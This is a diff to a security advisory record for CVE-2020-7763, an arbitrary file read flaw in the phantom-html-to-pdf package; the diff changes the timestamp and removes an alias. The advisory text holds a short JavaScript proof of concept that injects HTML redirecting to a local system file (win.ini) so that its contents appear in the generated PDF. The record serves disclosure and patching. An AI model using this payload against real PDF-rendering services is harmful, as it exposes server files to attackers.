@@ -1,11 +1,10 @@
 {
 	"schema_version": "1.6.0",
 	"id": "GHSA-6h7f-qwqm-35pp",
-	"modified": "2023-11-08T04:04:09.118804Z",
+	"modified": "2025-01-14T08:57:34.579561Z",
 	"published": "2020-11-06T18:06:16Z",
 	"aliases": [
-		"CVE-2020-7763",
-		"SNYK-JS-PHANTOMHTMLTOPDF-1023598"
+		"CVE-2020-7763"
 	],
 	"summary": "Arbitrary File Read in phantom-html-to-pdf",
 	"details": "This affects the package phantom-html-to-pdf before 0.6.1.\n\n### PoC\n```js\nvar fs = require('fs') var conversion = require(\"phantom-html-to-pdf\")();\nconversion.allowLocalFilesAccess = false conversion({\n    html: \"document.write(window.location='c:/windows/win.ini')\"\n}, function(err, pdf) {\n    var output = fs.createWriteStream('output.pdf') console.log(pdf.logs);\n    console.log(pdf.numberOfPages);\n    pdf.stream.pipe(output);\n});\n```",
